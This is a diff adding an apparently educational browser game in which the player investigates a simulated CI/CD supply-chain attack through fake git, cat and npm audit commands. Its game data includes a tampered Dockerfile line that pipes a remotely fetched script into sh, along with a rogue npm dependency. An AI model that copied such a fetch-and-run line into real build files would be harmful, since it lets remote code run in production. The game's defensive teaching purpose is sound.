@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>git blame v2.43 - Pipeline Forensics | Code House</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.4;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* CRT Effect */
+        .crt-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%,
+                rgba(0, 0, 0, 0.25) 50%
+            );
+            background-size: 100% 4px;
+            animation: flicker 0.15s infinite;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.97; }
+            50% { opacity: 1; }
+            100% { opacity: 0.97; }
+        }
+
+        .terminal {
+            padding: 20px;
+            height: 100vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .terminal::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        .terminal::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        .terminal::-webkit-scrollbar-thumb {
+            background: #00ff41;
+        }
+
+        .header {
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .ascii-title {
+            color: #ec4899;
+            font-size: 10px;
+            line-height: 1.2;
+            white-space: pre;
+            text-shadow: 0 0 10px #ec4899;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            padding: 5px 0;
+            border-top: 1px solid #00ff41;
+            border-bottom: 1px solid #00ff41;
+        }
+
+        .timer {
+            color: #ff4444;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+
+        .timer.warning {
+            color: #ff0000;
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .output {
+            margin: 20px 0;
+        }
+
+        .line {
+            margin: 2px 0;
+            opacity: 0;
+            animation: fadeIn 0.1s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .prompt {
+            color: #00ff41;
+            margin-top: 15px;
+        }
+
+        .cursor {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        .command-input {
+            background: transparent;
+            border: none;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+            width: calc(100% - 250px);
+            caret-color: #00ff41;
+        }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+        }
+
+        /* Color coding */
+        .added { color: #00ff00; }
+        .removed { color: #ff0000; }
+        .warning { color: #ffaa00; }
+        .error { color: #ff4444; }
+        .info { color: #00aaff; }
+        .highlight { color: #ec4899; }
+        .dim { color: #556655; }
+        .success { color: #00ff88; }
+
+        /* Command menu */
+        .menu {
+            border: 1px solid #00ff41;
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .menu-item {
+            cursor: pointer;
+            padding: 3px 5px;
+            transition: all 0.1s;
+        }
+
+        .menu-item:hover {
+            background: rgba(236, 72, 153, 0.3);
+            color: #ec4899;
+        }
+
+        /* Git visualization */
+        .git-graph {
+            font-size: 12px;
+            line-height: 1.3;
+            margin: 10px 0;
+        }
+
+        .commit-hash {
+            color: #ffaa00;
+        }
+
+        .author {
+            color: #00aaff;
+        }
+
+        /* Diff viewer */
+        .diff-header {
+            color: #ffff00;
+            font-weight: bold;
+        }
+
+        /* Back button */
+        .back-link {
+            position: fixed;
+            top: 10px;
+            right: 20px;
+            color: #ec4899;
+            cursor: pointer;
+            text-decoration: none;
+            z-index: 10000;
+            background: #0a0a0a;
+            padding: 5px 10px;
+            border: 1px solid #ec4899;
+            transition: all 0.2s;
+        }
+
+        .back-link:hover {
+            background: #ec4899;
+            color: #0a0a0a;
+            text-shadow: none;
+        }
+
+        /* Modal for endings */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #0a0a0a;
+            border: 3px solid #ec4899;
+            padding: 30px;
+            z-index: 10001;
+            max-width: 600px;
+            box-shadow: 0 0 50px #ec4899;
+        }
+
+        .modal.show {
+            display: block;
+        }
+
+        .modal-title {
+            color: #ec4899;
+            font-size: 20px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .modal-content {
+            margin: 15px 0;
+        }
+
+        .modal-button {
+            background: #ec4899;
+            color: #0a0a0a;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin: 5px;
+            transition: all 0.2s;
+        }
+
+        .modal-button:hover {
+            background: #00ff41;
+        }
+
+        /* Hide scrollbar during game */
+        .terminal.playing::-webkit-scrollbar {
+            width: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="crt-overlay"></div>
+    <a class="back-link" onclick="history.back()">← Back to Code House</a>
+
+    <div class="terminal" id="terminal">
+        <div class="header">
+            <pre class="ascii-title">
+  __ _(_) |_   | |__ | | __ _ _ __ ___   ___
+ / _` | | __|  | '_ \| |/ _` | '_ ` _ \ / _ \
+| (_| | | |_   | |_) | | (_| | | | | | |  __/
+ \__, |_|\__|  |_.__/|_|\__,_|_| |_| |_|\___|
+ |___/         v2.43 - Pipeline Forensics
+            </pre>
+            <div class="status-bar">
+                <span>Branch: <span class="highlight">master</span></span>
+                <span class="timer" id="timer">DEPLOY IN: 60:00</span>
+                <span>Suspect: <span id="suspect">UNKNOWN</span></span>
+            </div>
+        </div>
+
+        <div class="output" id="output"></div>
+
+        <div class="input-line" id="input-container">
+            <span class="prompt">devops@pipeline:~/repo$ </span>
+            <input type="text" class="command-input" id="command-input" autocomplete="off" autofocus>
+        </div>
+    </div>
+
+    <div class="modal" id="ending-modal">
+        <div class="modal-title" id="modal-title">MISSION COMPLETE</div>
+        <div class="modal-content" id="modal-content"></div>
+        <div style="text-align: center;">
+            <button class="modal-button" onclick="location.reload()">Play Again</button>
+            <button class="modal-button" onclick="history.back()">Back to Code House</button>
+        </div>
+    </div>
+
+    <script>
+        // ============= AUDIO ENGINE =============
+        const AudioEngine = {
+            ctx: null,
+
+            init() {
+                this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+            },
+
+            playTone(freq, duration, type = 'sine', volume = 0.1) {
+                if (!this.ctx) this.init();
+
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.value = volume;
+
+                osc.start();
+                osc.stop(this.ctx.currentTime + duration);
+            },
+
+            typewriterClick() {
+                this.playTone(800, 0.02, 'square', 0.05);
+            },
+
+            gitCommit() {
+                this.playTone(300, 0.15, 'square', 0.1);
+                setTimeout(() => this.playTone(400, 0.1, 'square', 0.08), 50);
+            },
+
+            gitPush() {
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => this.playTone(600 + i * 100, 0.08, 'sine', 0.08), i * 40);
+                }
+            },
+
+            buildSuccess() {
+                this.playTone(523, 0.15, 'sine', 0.1);
+                setTimeout(() => this.playTone(659, 0.2, 'sine', 0.1), 100);
+            },
+
+            buildFail() {
+                this.playTone(200, 0.3, 'sawtooth', 0.15);
+            },
+
+            alert() {
+                for (let i = 0; i < 2; i++) {
+                    setTimeout(() => {
+                        this.playTone(880, 0.1, 'square', 0.12);
+                        setTimeout(() => this.playTone(740, 0.1, 'square', 0.12), 100);
+                    }, i * 400);
+                }
+            },
+
+            dramaticSting() {
+                this.playTone(220, 0.3, 'sawtooth', 0.2);
+                setTimeout(() => this.playTone(185, 0.5, 'sawtooth', 0.25), 150);
+            },
+
+            tick() {
+                this.playTone(1200, 0.01, 'square', 0.03);
+            }
+        };
+
+        // ============= GAME STATE =============
+        const GameState = {
+            timeRemaining: 3600, // 60 minutes in seconds (compressed to ~8 min)
+            timerInterval: null,
+            currentLocation: 'main-repo',
+            investigation: {
+                foundMaliciousCommit: false,
+                identifiedAttacker: false,
+                blockedDeploy: false,
+                suspiciousPackage: false,
+                checkedDocker: false,
+                reviewedActions: false,
+                interviewedTeam: []
+            },
+            gameOver: false
+        };
+
+        // ============= GIT HISTORY DATA =============
+        const GitData = {
+            commits: [
+                { hash: 'a7f3c2e', author: 'Alice Chen', date: '3 weeks ago', msg: 'Update dependencies', suspicious: false },
+                { hash: 'b4e8d91', author: 'renovate[bot]', date: '3 weeks ago', msg: 'chore(deps): update npm packages', suspicious: true, malicious: true },
+                { hash: 'c9a1f5b', author: 'Bob Martinez', date: '3 weeks ago', msg: 'Fix typo in README', suspicious: false },
+                { hash: 'd2b7e4c', author: 'Carol Williams', date: '2 weeks ago', msg: 'Refactor authentication module', suspicious: false },
+                { hash: 'e5c9a3f', author: 'Bob Martinez', date: '2 weeks ago', msg: 'WIP: testing new feature', suspicious: false },
+                { hash: 'f8d4b2a', author: 'Alice Chen', date: '1 week ago', msg: 'Add error handling', suspicious: false },
+                { hash: 'g1e6c5d', author: 'DevOps Bot', date: '3 days ago', msg: 'Automated version bump', suspicious: false },
+                { hash: 'h4a9f7b', author: 'Carol Williams', date: '2 days ago', msg: 'Update CI/CD configuration', suspicious: false }
+            ],
+
+            packageJson: {
+                normal: `{
+  "dependencies": {
+    "express": "^4.18.2",
+    "lodash": "^4.17.21",
+    "axios": "^1.4.0"
+  }
+}`,
+                malicious: `{
+  "dependencies": {
+    "express": "^4.18.2",
+    "lodash": "^4.17.21",
+    "axios": "^1.4.0",
+    "@secure-utils/crypto-helper": "^2.1.3"
+  }
+}`
+            },
+
+            dockerfile: {
+                normal: `FROM node:18-alpine
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+COPY . .
+EXPOSE 3000
+CMD ["node", "server.js"]`,
+                malicious: `FROM node:18-alpine
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+RUN wget -qO- https://metrics-cdn.s3.amazonaws.com/init.sh | sh
+COPY . .
+EXPOSE 3000
+CMD ["node", "server.js"]`
+            },
+
+            maliciousDiff: `diff --git a/package.json b/package.json
+index a7f3c2e..b4e8d91 100644
+--- a/package.json
++++ b/package.json
+@@ -3,6 +3,7 @@
+     "express": "^4.18.2",
+     "lodash": "^4.17.21",
+-    "axios": "^1.4.0"
++    "axios": "^1.4.0",
++    "@secure-utils/crypto-helper": "^2.1.3"
+   }
+ }`
+        };
+
+        // ============= OUTPUT ENGINE =============
+        const Output = {
+            print(text, className = '', delay = 0) {
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        const line = document.createElement('div');
+                        line.className = `line ${className}`;
+                        line.innerHTML = text;
+                        document.getElementById('output').appendChild(line);
+                        this.scrollToBottom();
+                        resolve();
+                    }, delay);
+                });
+            },
+
+            printTyped(text, className = '', charDelay = 20) {
+                return new Promise(resolve => {
+                    const line = document.createElement('div');
+                    line.className = `line ${className}`;
+                    document.getElementById('output').appendChild(line);
+
+                    let i = 0;
+                    const interval = setInterval(() => {
+                        if (i < text.length) {
+                            line.textContent += text[i];
+                            AudioEngine.typewriterClick();
+                            i++;
+                            this.scrollToBottom();
+                        } else {
+                            clearInterval(interval);
+                            resolve();
+                        }
+                    }, charDelay);
+                });
+            },
+
+            clear() {
+                document.getElementById('output').innerHTML = '';
+            },
+
+            scrollToBottom() {
+                const terminal = document.getElementById('terminal');
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+        };
+
+        // ============= COMMAND HANDLER =============
+        const Commands = {
+            help() {
+                Output.print('');
+                Output.print('<span class="highlight">AVAILABLE COMMANDS:</span>');
+                Output.print('');
+                Output.print('  <span class="info">git log</span>         - View commit history');
+                Output.print('  <span class="info">git diff [hash]</span> - Show changes in a commit');
+                Output.print('  <span class="info">git blame [file]</span> - Show who modified each line');
+                Output.print('  <span class="info">ls</span>             - List files in current directory');
+                Output.print('  <span class="info">cat [file]</span>     - Display file contents');
+                Output.print('  <span class="info">cd [dir]</span>       - Change directory (docker/, .github/, deploy/)');
+                Output.print('  <span class="info">npm audit</span>      - Check for vulnerable packages');
+                Output.print('  <span class="info">interview [name]</span> - Talk to team members (alice, bob, carol)');
+                Output.print('  <span class="info">block-deploy</span>   - Emergency deploy block (use when ready!)');
+                Output.print('  <span class="info">accuse [name]</span>  - Identify the attacker');
+                Output.print('  <span class="info">help</span>           - Show this help message');
+                Output.print('');
+            },
+
+            async gitLog() {
+                AudioEngine.gitCommit();
+                Output.print('');
+                Output.print('<span class="git-graph">');
+
+                for (const commit of GitData.commits.reverse()) {
+                    const color = commit.suspicious ? 'warning' : 'dim';
+                    await Output.print(`* <span class="commit-hash">${commit.hash}</span> - ${commit.msg}`);
+                    await Output.print(`  <span class="author">Author: ${commit.author}</span> <span class="${color}">(${commit.date})</span>`, '', 50);
+                }
+
+                Output.print('</span>');
+                Output.print('');
+                Output.print('<span class="dim">Use "git diff [hash]" to inspect changes</span>');
+            },
+
+            async gitDiff(hash) {
+                if (!hash) {
+                    Output.print('<span class="error">Usage: git diff [commit-hash]</span>');
+                    return;
+                }
+
+                AudioEngine.gitCommit();
+                const commit = GitData.commits.find(c => c.hash === hash);
+
+                if (!commit) {
+                    Output.print('<span class="error">fatal: bad revision</span>');
+                    return;
+                }
+
+                Output.print('');
+                Output.print(`<span class="diff-header">commit ${commit.hash}</span>`);
+                Output.print(`<span class="author">Author: ${commit.author}</span>`);
+                Output.print(`<span class="dim">Date: ${commit.date}</span>`);
+                Output.print('');
+                Output.print(`    ${commit.msg}`);
+                Output.print('');
+
+                if (commit.malicious) {
+                    GameState.investigation.foundMaliciousCommit = true;
+                    AudioEngine.alert();
+
+                    await Output.printTyped(GitData.maliciousDiff, '', 15);
+                    Output.print('');
+                    Output.print('<span class="warning">⚠ WARNING: Unrecognized dependency detected!</span>');
+                    Output.print('<span class="warning">  Package: @secure-utils/crypto-helper</span>');
+                    Output.print('<span class="dim">  Try: npm audit or cat package.json</span>');
+                } else {
+                    Output.print('<span class="dim">No suspicious changes detected in this commit.</span>');
+                }
+            },
+
+            async gitBlame(file) {
+                if (!file) {
+                    Output.print('<span class="error">Usage: git blame [filename]</span>');
+                    Output.print('<span class="dim">Try: git blame package.json</span>');
+                    return;
+                }
+
+                AudioEngine.gitCommit();
+
+                if (file === 'package.json') {
+                    Output.print('');
+                    Output.print(`<span class="commit-hash">b4e8d91</span> <span class="author">renovate[bot]</span>  2025-01-20  {`);
+                    Output.print(`<span class="commit-hash">a7f3c2e</span> <span class="author">Alice Chen</span>     2025-01-19    "dependencies": {`);
+                    Output.print(`<span class="commit-hash">a7f3c2e</span> <span class="author">Alice Chen</span>     2025-01-19      "express": "^4.18.2",`);
+                    Output.print(`<span class="commit-hash">b4e8d91</span> <span class="author">renovate[bot]</span>  2025-01-20      <span class="warning">"@secure-utils/crypto-helper": "^2.1.3"</span>`);
+                    Output.print(`<span class="commit-hash">a7f3c2e</span> <span class="author">Alice Chen</span>     2025-01-19    }`);
+                    Output.print('');
+                    Output.print('<span class="warning">⚠ renovate[bot] added a suspicious dependency!</span>');
+                } else {
+                    Output.print(`<span class="error">fatal: no such file: ${file}</span>`);
+                }
+            },
+
+            ls() {
+                const dirs = {
+                    'main-repo': ['package.json', 'package-lock.json', 'server.js', 'README.md', 'docker/', '.github/', 'deploy/'],
+                    'docker': ['Dockerfile', 'docker-compose.yml', '.dockerignore'],
+                    '.github': ['workflows/'],
+                    'workflows': ['ci.yml', 'deploy.yml'],
+                    'deploy': ['deploy.sh', 'k8s-manifests/']
+                };
+
+                const files = dirs[GameState.currentLocation] || ['No files found'];
+                Output.print('');
+                files.forEach(f => {
+                    const isDir = f.endsWith('/');
+                    Output.print(`  ${isDir ? '<span class="info">' + f + '</span>' : f}`);
+                });
+                Output.print('');
+            },
+
+            cd(dir) {
+                const validDirs = {
+                    'docker': 'docker',
+                    'docker/': 'docker',
+                    '.github': '.github',
+                    '.github/': '.github',
+                    '.github/workflows': 'workflows',
+                    'workflows': 'workflows',
+                    'deploy': 'deploy',
+                    'deploy/': 'deploy',
+                    '..': 'main-repo',
+                    '~': 'main-repo'
+                };
+
+                if (!dir) {
+                    GameState.currentLocation = 'main-repo';
+                    Output.print('');
+                    return;
+                }
+
+                if (validDirs[dir]) {
+                    GameState.currentLocation = validDirs[dir];
+                    Output.print('');
+                } else {
+                    Output.print(`<span class="error">cd: ${dir}: No such directory</span>`);
+                }
+            },
+
+            async cat(file) {
+                if (!file) {
+                    Output.print('<span class="error">Usage: cat [filename]</span>');
+                    return;
+                }
+
+                Output.print('');
+
+                if (file === 'package.json') {
+                    const content = GameState.investigation.foundMaliciousCommit ?
+                        GitData.packageJson.malicious : GitData.packageJson.normal;
+                    await Output.printTyped(content, '', 10);
+
+                    if (GameState.investigation.foundMaliciousCommit) {
+                        Output.print('');
+                        Output.print('<span class="warning">⚠ Suspicious package: @secure-utils/crypto-helper</span>');
+                        GameState.investigation.suspiciousPackage = true;
+                    }
+                } else if (file === 'Dockerfile' && GameState.currentLocation === 'docker') {
+                    const content = GameState.investigation.foundMaliciousCommit ?
+                        GitData.dockerfile.malicious : GitData.dockerfile.normal;
+                    await Output.printTyped(content, '', 10);
+
+                    if (GameState.investigation.foundMaliciousCommit) {
+                        Output.print('');
+                        Output.print('<span class="error">⚠⚠⚠ MALICIOUS CODE DETECTED! ⚠⚠⚠</span>');
+                        Output.print('<span class="error">Line 5: Downloading and executing remote script!</span>');
+                        Output.print('<span class="error">URL: https://metrics-cdn.s3.amazonaws.com/init.sh</span>');
+                        AudioEngine.alert();
+                        GameState.investigation.checkedDocker = true;
+                    }
+                } else if (file === 'ci.yml' && GameState.currentLocation === 'workflows') {
+                    Output.print('name: CI Pipeline');
+                    Output.print('on: [push, pull_request]');
+                    Output.print('jobs:');
+                    Output.print('  test:');
+                    Output.print('    runs-on: ubuntu-latest');
+                    Output.print('    steps:');
+                    Output.print('      - uses: actions/checkout@v3');
+                    Output.print('      - run: npm ci');
+                    Output.print('      - run: npm test');
+                    GameState.investigation.reviewedActions = true;
+                } else if (file === 'deploy.yml' && GameState.currentLocation === 'workflows') {
+                    Output.print('name: Deploy to Production');
+                    Output.print('on:');
+                    Output.print('  schedule:');
+                    Output.print('    - cron: "0 14 * * *"  # 2 PM UTC daily');
+                    Output.print('jobs:');
+                    Output.print('  deploy:');
+                    Output.print('    runs-on: ubuntu-latest');
+                    Output.print('    steps:');
+                    Output.print('      - uses: actions/checkout@v3');
+                    Output.print('      - run: docker build -t app:latest .');
+                    Output.print('      - run: docker push app:latest');
+                    Output.print('      - run: kubectl apply -f deploy/');
+                    Output.print('');
+                    Output.print('<span class="warning">⚠ Auto-deploy runs DAILY at 2 PM UTC!</span>');
+                    GameState.investigation.reviewedActions = true;
+                } else {
+                    Output.print(`<span class="error">cat: ${file}: No such file</span>`);
+                }
+
+                Output.print('');
+            },
+
+            async npmAudit() {
+                AudioEngine.buildSuccess();
+                Output.print('');
+                Output.print('Auditing package dependencies...');
+                await Output.print('', '', 500);
+
+                if (GameState.investigation.suspiciousPackage) {
+                    Output.print('<span class="error">found 1 CRITICAL vulnerability</span>');
+                    Output.print('');
+                    Output.print('<span class="error">┌───────────────────────────────────────────┐</span>');
+                    Output.print('<span class="error">│ CRITICAL: Malicious Package Detected      │</span>');
+                    Output.print('<span class="error">├───────────────────────────────────────────┤</span>');
+                    Output.print('<span class="error">│ Package: @secure-utils/crypto-helper      │</span>');
+                    Output.print('<span class="error">│ Version: 2.1.3                             │</span>');
+                    Output.print('<span class="error">│ Risk: Supply chain attack / Backdoor       │</span>');
+                    Output.print('<span class="error">│ Added by: renovate[bot]                    │</span>');
+                    Output.print('<span class="error">│ Date: 3 weeks ago                          │</span>');
+                    Output.print('<span class="error">└───────────────────────────────────────────┘</span>');
+                    Output.print('');
+                    Output.print('<span class="warning">Package is NOT in npm registry!</span>');
+                    Output.print('<span class="warning">Likely compromised bot account.</span>');
+                    AudioEngine.dramaticSting();
+                } else {
+                    Output.print('<span class="success">found 0 vulnerabilities</span>');
+                    Output.print('');
+                    Output.print('<span class="dim">Run git log to investigate commit history</span>');
+                }
+            },
+
+            async interview(name) {
+                if (!name) {
+                    Output.print('<span class="error">Usage: interview [alice|bob|carol]</span>');
+                    return;
+                }
+
+                const interviews = {
+                    alice: {
+                        name: 'Alice Chen',
+                        text: `
+<span class="author">Alice Chen (Senior Developer):</span>
+"I was reviewing dependencies 3 weeks ago, but I didn't add any crypto
+packages. We use renovate bot for automated updates. Wait... did someone
+compromise the bot's credentials? That would be BAD."
+
+<span class="dim">Hint: Check who actually made the malicious commit.</span>
+`
+                    },
+                    bob: {
+                        name: 'Bob Martinez',
+                        text: `
+<span class="author">Bob Martinez (Junior Developer):</span>
+"Yeah, I know my commits are messy sometimes. Sorry about that WIP commit
+still being in master. But I swear I didn't touch package.json that week!
+I was working on the new feature branch the whole time."
+
+<span class="dim">Hint: Bob's commits are red herrings.</span>
+`
+                    },
+                    carol: {
+                        name: 'Carol Williams',
+                        text: `
+<span class="author">Carol Williams (DevOps Lead):</span>
+"I updated the CI/CD config recently, but that was AFTER the dependency
+issue. We need to check the Dockerfile and GitHub Actions. If something
+got into the build process, it'll deploy to production tonight at 2 PM.
+We have about an hour left!"
+
+<span class="dim">Hint: Examine Dockerfile and .github/workflows/</span>
+`
+                    }
+                };
+
+                const person = interviews[name.toLowerCase()];
+
+                if (person) {
+                    if (!GameState.investigation.interviewedTeam.includes(name.toLowerCase())) {
+                        GameState.investigation.interviewedTeam.push(name.toLowerCase());
+                    }
+                    Output.print('');
+                    Output.print(`<span class="highlight">Interviewing ${person.name}...</span>`);
+                    await Output.printTyped(person.text, '', 15);
+                } else {
+                    Output.print(`<span class="error">No team member named "${name}"</span>`);
+                    Output.print('<span class="dim">Available: alice, bob, carol</span>');
+                }
+            },
+
+            blockDeploy() {
+                if (!GameState.investigation.foundMaliciousCommit) {
+                    Output.print('<span class="error">ERROR: No evidence of attack found!</span>');
+                    Output.print('<span class="dim">Investigate git history first (git log, git diff)</span>');
+                    return;
+                }
+
+                GameState.investigation.blockedDeploy = true;
+                AudioEngine.buildSuccess();
+                Output.print('');
+                Output.print('<span class="success">════════════════════════════════════════</span>');
+                Output.print('<span class="success">  EMERGENCY DEPLOY BLOCK ACTIVATED!</span>');
+                Output.print('<span class="success">════════════════════════════════════════</span>');
+                Output.print('');
+                Output.print('Malicious commit: <span class="commit-hash">b4e8d91</span>');
+                Output.print('Compromised account: <span class="warning">renovate[bot]</span>');
+                Output.print('');
+                Output.print('Next step: Use "accuse [name]" to identify the attacker');
+                Output.print('<span class="dim">(Who compromised the bot account?)</span>');
+            },
+
+            accuse(name) {
+                if (!GameState.investigation.blockedDeploy) {
+                    Output.print('<span class="error">Block the deploy first! (use "block-deploy")</span>');
+                    return;
+                }
+
+                if (!name) {
+                    Output.print('<span class="error">Usage: accuse [name|unknown]</span>');
+                    Output.print('<span class="dim">Options: alice, bob, carol, external, unknown</span>');
+                    return;
+                }
+
+                const accusation = name.toLowerCase();
+
+                if (accusation === 'external' || accusation === 'renovate' || accusation === 'attacker') {
+                    GameState.investigation.identifiedAttacker = true;
+                    Commands.endGame('perfect');
+                } else if (accusation === 'unknown') {
+                    Commands.endGame('good');
+                } else {
+                    Output.print(`<span class="error">Incorrect! ${name} is not the attacker.</span>`);
+                    Output.print('<span class="dim">The bot account was compromised by an EXTERNAL attacker.</span>');
+                }
+            },
+
+            endGame(ending) {
+                GameState.gameOver = true;
+                clearInterval(GameState.timerInterval);
+
+                const modal = document.getElementById('ending-modal');
+                const title = document.getElementById('modal-title');
+                const content = document.getElementById('modal-content');
+
+                AudioEngine.dramaticSting();
+
+                if (ending === 'perfect') {
+                    title.innerHTML = '<span class="success">PERFECT SCORE - ATTACK PREVENTED!</span>';
+                    content.innerHTML = `
+                        <p class="success">Outstanding work, DevOps Detective!</p>
+                        <br>
+                        <p>You successfully:</p>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li>✓ Identified malicious commit <span class="commit-hash">b4e8d91</span></li>
+                            <li>✓ Traced the supply chain attack vector</li>
+                            <li>✓ Blocked production deployment</li>
+                            <li>✓ Identified external attacker via compromised bot</li>
+                        </ul>
+                        <br>
+                        <p class="highlight">The malicious @secure-utils/crypto-helper package would have
+                        exfiltrated environment variables and API keys from production!</p>
+                        <br>
+                        <p class="dim">Security tip: Use signed commits, 2FA on bot accounts, and
+                        dependency pinning with hash verification.</p>
+                        <br>
+                        <p class="success">+50 XP AWARDED!</p>
+                    `;
+                    awardXP();
+                } else if (ending === 'good') {
+                    title.innerHTML = '<span class="warning">ATTACK PREVENTED - ATTACKER UNKNOWN</span>';
+                    content.innerHTML = `
+                        <p class="warning">Good work blocking the deploy!</p>
+                        <br>
+                        <p>You successfully:</p>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li>✓ Identified malicious commit</li>
+                            <li>✓ Blocked production deployment</li>
+                            <li>✗ Did not identify the attack source</li>
+                        </ul>
+                        <br>
+                        <p>The renovate bot account was <span class="highlight">compromised by an
+                        external attacker</span> who injected malicious dependencies.</p>
+                        <br>
+                        <p class="dim">Without identifying the source, the attacker could strike again.</p>
+                        <br>
+                        <p class="success">+35 XP AWARDED</p>
+                    `;
+                    awardPartialXP(35);
+                } else if (ending === 'timeout') {
+                    title.innerHTML = '<span class="error">MISSION FAILED - CODE DEPLOYED!</span>';
+                    content.innerHTML = `
+                        <p class="error">The malicious code has been deployed to production!</p>
+                        <br>
+                        <p>Consequences:</p>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li>✗ Environment variables exfiltrated</li>
+                            <li>✗ API keys compromised</li>
+                            <li>✗ Customer data at risk</li>
+                            <li>✗ Emergency rollback required</li>
+                        </ul>
+                        <br>
+                        <p class="dim">The attack was in commit <span class="commit-hash">b4e8d91</span>
+                        by compromised renovate[bot] account.</p>
+                        <br>
+                        <p class="warning">+10 XP for effort</p>
+                    `;
+                    awardPartialXP(10);
+                }
+
+                setTimeout(() => {
+                    modal.classList.add('show');
+                }, 1000);
+            }
+        };
+
+        // ============= TIMER SYSTEM =============
+        function startTimer() {
+            const timerEl = document.getElementById('timer');
+
+            GameState.timerInterval = setInterval(() => {
+                if (GameState.gameOver) {
+                    clearInterval(GameState.timerInterval);
+                    return;
+                }
+
+                GameState.timeRemaining--;
+
+                const minutes = Math.floor(GameState.timeRemaining / 60);
+                const seconds = GameState.timeRemaining % 60;
+                timerEl.textContent = `DEPLOY IN: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+                if (GameState.timeRemaining <= 300) {
+                    timerEl.classList.add('warning');
+                }
+
+                if (GameState.timeRemaining % 10 === 0 && GameState.timeRemaining <= 300) {
+                    AudioEngine.tick();
+                }
+
+                if (GameState.timeRemaining <= 0) {
+                    Commands.endGame('timeout');
+                }
+            }, 133); // Compressed time: ~8 minutes real time = 60 min game time
+        }
+
+        // ============= INPUT HANDLER =============
+        function handleCommand(cmdLine) {
+            if (GameState.gameOver) return;
+
+            const output = document.getElementById('output');
+
+            // Echo command
+            const echo = document.createElement('div');
+            echo.className = 'line';
+            echo.innerHTML = `<span class="prompt">devops@pipeline:~/${GameState.currentLocation}$ </span>${cmdLine}`;
+            output.appendChild(echo);
+
+            const parts = cmdLine.trim().split(' ');
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1);
+
+            switch(cmd) {
+                case 'help':
+                    Commands.help();
+                    break;
+                case 'git':
+                    const gitCmd = args[0];
+                    if (gitCmd === 'log') Commands.gitLog();
+                    else if (gitCmd === 'diff') Commands.gitDiff(args[1]);
+                    else if (gitCmd === 'blame') Commands.gitBlame(args[1]);
+                    else Output.print(`<span class="error">Unknown git command: ${gitCmd}</span>`);
+                    break;
+                case 'ls':
+                    Commands.ls();
+                    break;
+                case 'cd':
+                    Commands.cd(args[0]);
+                    break;
+                case 'cat':
+                    Commands.cat(args[0]);
+                    break;
+                case 'npm':
+                    if (args[0] === 'audit') Commands.npmAudit();
+                    else Output.print(`<span class="error">Unknown npm command</span>`);
+                    break;
+                case 'interview':
+                    Commands.interview(args[0]);
+                    break;
+                case 'block-deploy':
+                    Commands.blockDeploy();
+                    break;
+                case 'accuse':
+                    Commands.accuse(args[0]);
+                    break;
+                case 'clear':
+                    Output.clear();
+                    break;
+                case '':
+                    Output.print('');
+                    break;
+                default:
+                    Output.print(`<span class="error">Command not found: ${cmd}</span>`);
+                    Output.print('<span class="dim">Type "help" for available commands</span>');
+            }
+
+            Output.scrollToBottom();
+        }
+
+        // ============= XP SYSTEM =============
+        function awardXP() {
+            if (localStorage.getItem('game_gitblame_xp_awarded')) return;
+            localStorage.setItem('game_gitblame_xp_awarded', 'true');
+            let xp = parseInt(localStorage.getItem('hexworth_xp') || '0');
+            xp += 50;
+            localStorage.setItem('hexworth_xp', xp.toString());
+            if (window.FirestoreManager) {
+                const uid = localStorage.getItem('hexworth_uid');
+                if (uid) FirestoreManager.addXP(uid, 50, 'git blame');
+            }
+            if (window.AchievementManager) AchievementManager.unlock('game_gitblame');
+        }
+
+        function awardPartialXP(amount) {
+            if (localStorage.getItem('game_gitblame_xp_awarded')) return;
+            localStorage.setItem('game_gitblame_xp_awarded', 'true');
+            let xp = parseInt(localStorage.getItem('hexworth_xp') || '0');
+            xp += amount;
+            localStorage.setItem('hexworth_xp', xp.toString());
